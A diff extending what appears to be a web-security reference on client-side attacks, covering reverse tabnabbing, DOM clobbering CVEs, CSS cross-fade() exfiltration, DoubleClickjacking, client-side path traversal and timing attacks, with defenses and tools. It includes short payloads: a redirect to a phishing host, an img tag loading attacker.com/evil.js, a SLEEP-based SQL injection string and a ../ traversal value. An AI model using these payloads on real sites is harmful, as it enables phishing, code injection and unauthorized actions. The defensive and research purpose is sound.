@@ -227,6 +227,25 @@ Tools: Posta (Chrome extension), DOM Invader (Burp), manual DevTools: `getEventL
 
 ---
 
+### Reverse Tabnabbing
+
+When a page opens a link with `target="_blank"` without `rel="noopener"`, the opened page gets a reference to the opener via `window.opener`. The opened page can then navigate the opener to a phishing page:
+
+```javascript
+// In attacker-controlled page opened via target="_blank"
+window.opener.location = "https://phishing.com/fake-login";
+```
+
+**Impact:** Victim sees their original tab has "navigated" to a login page and enters credentials.
+
+**Modern status:** Most modern browsers set `noopener` by default for `target="_blank"` links (Chrome 88+, Firefox 79+, Safari 12.1+). Still relevant for:
+- Older browser versions
+- `window.open()` calls without `noopener` feature
+- Frameworks that explicitly set `opener` reference
+- Electron apps and WebViews
+
+---
+
 ## DOM Clobbering
 
 ### Core Mechanism
@@ -276,6 +295,24 @@ Sanitizers expect `.attributes` to be `NamedNodeMap`. Clobbering with `<input>` 
 - Anchor elements return their `href` when coerced to string — attackers control string value
 - Form elements return `[object HTMLFormElement]` — useful for type-check bypasses
 
+### DOM Clobbering CVE Collection (2024-2025)
+
+Widespread DOM clobbering vulnerabilities discovered across major frontend tooling — most exploitable via `document.currentScript` or `document.scripts` clobbering in HTML injection contexts (e.g., markdown renderers, CMS user content, email HTML).
+
+| Library | CVE | Clobbered Property | Impact |
+|---------|-----|-------------------|--------|
+| **Vite** | CVE-2024-45812 | `document.currentScript` | XSS in dev server via clobbered script src |
+| **Webpack** | CVE-2024-43788 | `document.currentScript.src` | XSS in dev server hot reload |
+| **Astro** | CVE-2024-47885 | `document.scripts` | XSS in SSR pages with user-controlled HTML |
+| **Rollup** | (reported) | `document.currentScript` | XSS in bundled output |
+| **Prism.js** | (reported) | `document.currentScript`/`document.scripts` | XSS via syntax highlighter |
+| **MathJax** | (reported) | `document.currentScript` | XSS in math rendering contexts |
+| **FilePond** | (reported) | Named form elements | XSS via file upload widget |
+
+**Common gadget pattern:** Libraries use `document.currentScript.src` to determine their base URL for loading additional resources. Clobbering with `<img name="currentScript" src="https://attacker.com/evil.js">` redirects resource loading to attacker server.
+
+**`document.scripts` collection clobbering:** `<img name="scripts">` replaces `document.scripts` HTMLCollection with a single element, breaking iteration-based script detection and enabling injection.
+
 ---
 
 ## CSS Injection Exfiltration
@@ -317,6 +354,73 @@ Browser only fetches font if target contains matching characters.
 - `style-src 'unsafe-inline'` (extremely common) enables inline injection
 - `:has()` technique works entirely within existing page styles
 - No JavaScript execution needed for any CSS exfiltration technique
+
+### cross-fade() Recursive Exfiltration (Proton Mail Research)
+
+Advanced CSS exfiltration technique using nested `cross-fade()` CSS function to assign multiple background URLs to a single element — each URL triggers a separate fetch, enabling parallel character extraction.
+
+**Mechanism:**
+1. Use CSS attribute selectors to detect substrings in target value (e.g., blob URL, CSRF token)
+2. Each matching selector sets a CSS variable to a unique callback URL
+3. A final selector nests all variables inside `cross-fade()` calls: `cross-fade(url(var(--a)), cross-fade(url(var(--b)), ...))`
+4. Browser must fetch ALL URLs in the nesting tree to render the final image
+5. Unset variables default to `none` (no fetch) — only matching selectors trigger requests
+
+**Advantages over sequential methods:**
+- Multiple characters leaked per page load (vs one-at-a-time with `@import` chains)
+- Works with `content-visibility: auto` for triggering without scroll
+- Used to leak blob URLs in Proton Mail (SonarSource research, 2024)
+- No JavaScript execution needed — pure CSS
+
+---
+
+### DoubleClickjacking (2024)
+
+A new UI redressing attack class by Paulos Yibelo that bypasses ALL known clickjacking protections including `X-Frame-Options`, CSP `frame-ancestors`, and `SameSite: Lax/Strict` cookies.
+
+**Mechanism:**
+1. Attacker page opens a new window with a button (e.g., "Click to verify")
+2. On first click of a double-click: `mousedown` event fires immediately (before `onclick`), attacker swaps the top window content to expose a sensitive action (OAuth authorize, account settings)
+3. On second click: victim unknowingly clicks the now-exposed sensitive button
+4. Exploits timing difference between `mousedown` (fires immediately on press) and `onclick` (waits for complete click-release cycle) — works regardless of double-click speed
+
+**Key properties:**
+- No iframes needed — bypasses `X-Frame-Options` and `frame-ancestors`
+- No cross-site cookies needed — bypasses `SameSite` protections
+- Works on virtually every website with OAuth or sensitive one-click actions
+- Affects platforms: Salesforce, Slack, Shopify, and most OAuth-based services
+- Improvement by Jorian: victim can click anywhere on page to trigger (not just a specific button)
+
+**Defenses:**
+- Disable critical buttons until intentional user gesture detected (e.g., mouse movement or key press)
+- Use `onclick` handlers (not `mousedown`) for sensitive actions
+- Require explicit confirmation dialogs for destructive/sensitive operations
+
+### Client-Side Path Traversal (CSPT)
+
+Also called "On-site Request Forgery" — exploits client-side `fetch()`/`XMLHttpRequest` calls where `../` can be injected into the URL path to redirect the request to a different endpoint.
+
+**Mechanism:**
+1. Frontend code constructs API URL using user-controlled value: `fetch('/api/users/' + userId + '/profile')`
+2. Attacker injects `../` sequences: `userId = '../../admin/delete-user'`
+3. After browser URL normalization, request goes to `/api/admin/delete-user` instead
+4. Browser automatically includes cookies and auth headers — acts as authenticated CSRF
+
+**CSPT → CSRF chain (Doyensec research):**
+- CSPT source: user-controlled value reflected in a `fetch()` URL path
+- CSPT sink: a different API endpoint (state-changing) reachable via path traversal
+- Since requests originate from the same frontend, all cookies/auth tokens are automatically attached
+- Bypasses traditional CSRF protections (SameSite cookies, origin checks) because the request genuinely originates from the legitimate frontend
+
+**Detection:**
+- Burp extension: `doyensec/CSPTBurpExtension` (passive scanner)
+- Canary token feature: inject unique token in source, check if it appears in sink request path
+- Manual: look for query parameters reflected inside paths of other requests in proxy history
+- WAF bypass via encoding levels (Matan Berson, 2024)
+
+**Tools:** Doyensec CSPT Burp Extension, Eval Villain (browser extension for DOM taint tracking)
+
+**Real-world CVEs:** Mattermost, Rocket.Chat, Jupyter (CVE-2023-39968 + CVE-2024-22421 chained with Chromium bug)
 
 ---
 
@@ -372,3 +476,25 @@ Cross-site information leakage without XSS — a distinct attack class exploitin
 - `SameSite=Lax/Strict` cookies — prevents cross-site requests from carrying credentials
 - Constant-time responses regardless of authentication state
 - `Vary: Cookie` with `Cache-Control: private` on authenticated resources
+
+---
+
+## Web Timing Attacks (PortSwigger Research, 2024-2025)
+
+Server-side timing analysis to detect vulnerabilities without relying on response content.
+
+### Practical Timing Signals
+
+| Signal | What It Reveals | Example |
+|--------|----------------|---------|
+| **Cache key detection** | Which params are in cache key | Keyed param: 310ms (DB hit) vs unkeyed: 22ms (cache hit) |
+| **Header processing** | Which headers trigger server logic | `authorization: x` → 50ms vs `foo: x` → 30ms |
+| **SSRF confirmation** | DNS resolution / connection | First request: 25ms; second (DNS cached): 15ms |
+| **SQLi confirmation** | Query execution time | `' AND SLEEP(2)--` adds 2000ms |
+| **Hidden param discovery** | Server processes undocumented params | `?debug=1` adds 200ms processing time |
+
+### Techniques
+- **Param Miner timing mode:** detect unkeyed parameters via response time differential
+- **DNS caching as SSRF oracle:** first request triggers DNS lookup (slow), second uses cache (fast) — proves server resolved the hostname
+- **Connection state timing:** server-side connection pool reuse vs new connection measurable via response time
+- **Single-packet timing:** HTTP/2 multiplexing to eliminate network jitter in timing measurements
